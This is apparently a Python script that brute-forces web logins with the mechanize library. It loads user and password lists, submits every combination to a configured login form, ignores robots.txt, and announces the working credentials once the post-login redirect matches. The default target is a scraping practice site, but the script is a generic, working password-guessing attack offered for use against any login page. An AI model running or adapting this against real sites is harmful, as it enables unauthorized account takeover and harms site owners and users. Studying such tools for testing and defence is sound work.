# !/usr/bin/python
# -*- coding: utf-8 -*-

# §§§§§§§§§§§§§§§§--**$**--§§§§§§§§§§§§§§§§
# §       Python web brute force          §
# §           with mechanize              §
# § https://github.com/27182818284590452  §
# §§§§§§§§§§§§§§§§--**$**--§§§§§§§§§§§§§§§§

# §§§§§§§§§§§--**Settings**--§§§§§§§§§§§
# Please set the path to your passlist
pass_filepath = "passwords.txt"

# Please set the path to your userlist
user_filepath = "users.txt"

# Please enter the login you want to brute force
login_page = "http://testing-ground.scraping.pro/login"

#Please set the page you will be redirected at a successful login
redirected_page = "http://testing-ground.scraping.pro/login?mode=welcome"

#Enter the html code of the form you want to brute force
login_form = '''
			<form action="login?mode=login" name="from1" method="POST">
        	<label for="usr">User name:</label>
        	<input id="usr" name="usr" type="text" placeholder="enter 'admin' here" kl_vkbd_parsed="true">
        	<label for="pwd">Password:</label>
        	<input id="pwd" name="pwd" type="text" placeholder="enter '12345' here" kl_vkbd_parsed="true">
        	<input type="submit" value="Login" kl_vkbd_parsed="true">
    		</form>
			'''
# §§§§§§§§§--**Settings-end**--§§§§§§§§§

import mechanize

# mechanize settings
br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)

# global vars
global username
username = ""

global password
password = ""

# open mechanize browser
# here you have to enter the page, you wan't to bruteforce
r = br.open(login_page)

# read file and convert to list^
def read_file(filepath):
	with open(filepath) as f:
		lines = f.read().splitlines()
	return lines

def banner():
	print ("\033[34m----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\033[0m")
	print ("\033[32m__________          __  .__                                  ___.     ___.                 __          _____                               ___ __________  __      ____________  ___    ")
	print ("\______   \___.__._/  |_|  |__   ____   ____   __  _  __ ____\_ |__   \_ |_________ __ ___/  |_  _____/ ____\___________   ____  ____     /  / \______   \/  \    /  \______   \ \  \   ")
 	print (" |     ___<   |  |\   __\  |  \ /  _ \ /    \  \ \/ \/ // __ \| __ \   | __ \_  __ \  |  \   __\/ __ \   __\/  _ \_  __ \_/ ___\/ __ \   /  /   |     ___/\   \/\/   /|    |  _/  \  \  ")
 	print (" |    |    \___  | |  | |   Y  (  <_> )   |  \  \     /\  ___/| \_\ \  | \_\ \  | \/  |  /|  | \  ___/|  | (  <_> )  | \/\  \__\  ___/  (  (    |    |     \        / |    |   \   )  ) ")
 	print (" |____|    / ____| |__| |___|  /\____/|___|  /   \/\_/  \___  >___  /  |___  /__|  |____/ |__|  \___  >__|  \____/|__|    \___  >___  >  \  \   |____|      \__/\  /  |______  /  /  /  ")
	print ("	   \/                \/            \/               \/    \/       \/                       \/                        \/    \/    \__\                   \/          \/  /__/   ")
	print ("\033[0m----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\033[0m")
	print ("\033[32m                                    ___.           ________      ____   _____ ____ .________________________  ________.________________              ")
	print ("                                    \_ |__ ___.__. \_____  \    /_   | /  |  /_   ||   ____/   __   \_____  \/  _____/|   ____/\_____  \             ")
 	print ("                                     | __ <   |  |   _(__  <     |   |/   |  ||   ||____  \\____    //  ____/   __  \ |____  \   _(__  <              ")
 	print ("                                     | \_\ \___  |  /       \    |   /    ^   /   |/       \  /    //       \  |__\  \/       \ /       \             ")
 	print ("                                     |___  / ____| /______  / /\ |___\____   ||___/______  / /____/ \_______ \_____  /______  //______  / /\  /\  /\  ")
	print ("                                         \/\/             \/  \/          |__|           \/                 \/     \/       \/        \/  \/  \/  \/ ")
	print ("\033[34m----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\033[0m")
def brute_force(usernames, username, passwords, password, redirected_page, login_form):
	for user in usernames:	
		username = user
	
		for passw in passwords:
			password = passw

			new_form = login_form
	
			#all you have to take care is they have the same name for input fields and submit button 
			r.set_data(new_form)
			br.set_response(r)
			br.select_form( nr = 0 )
			br.form['usr'] = ''.join(username)
			br.form['pwd'] = ''.join(password)
			print ("\033[32m[#] Checking ",br.form["usr"], " with password ", br.form["pwd"], "\033[0m")
			print ("\033[34m----------------------------------------------------------------------------------------------\033[0m")
	
			response=br.submit()
		
			if response.geturl()==redirected_page:
				#url to which the page is redirected after login
				print ("\033[32m[+] Correct password is ", password," with username ", username, "\033[0m")
				print ("\033[34m----------------------------------------------------------------------------------------------\033[0m")
				exit()

	print("\033[31m[!] Not successful, didn't find password! [!]\033[0m")

# declare lists
passwords = read_file(pass_filepath)
usernames = read_file(user_filepath)

# init everything
banner()
brute_force(usernames, username, passwords, password, redirected_page, login_form)
